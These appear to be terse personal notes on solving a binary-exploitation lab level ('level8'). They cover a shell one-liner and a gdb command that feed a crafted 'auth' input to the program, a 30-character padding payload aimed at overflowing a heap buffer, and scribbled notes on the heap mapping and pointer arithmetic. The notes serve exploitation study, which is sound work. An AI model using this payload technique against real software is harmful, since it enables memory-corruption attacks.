(python -c 'print ("auth " + "\x01")'; cat) | ./level8


```bash
(gdb) run < <(python -c 'print ("auth " + "\x01")')
```




### Payload

128 max


"auth "	+ "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	+
5		+					30				+
`auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAA`




char *auth = A * 30

```console
	 0x804a000  0x806b000    0x21000        0x0 [heap]
```


char	*ptr
*(ptr + 8 x 1) == ptr[8]

int		*ptr
*(ptr + 8 x 4) == ptr[8]

10000 == 10008
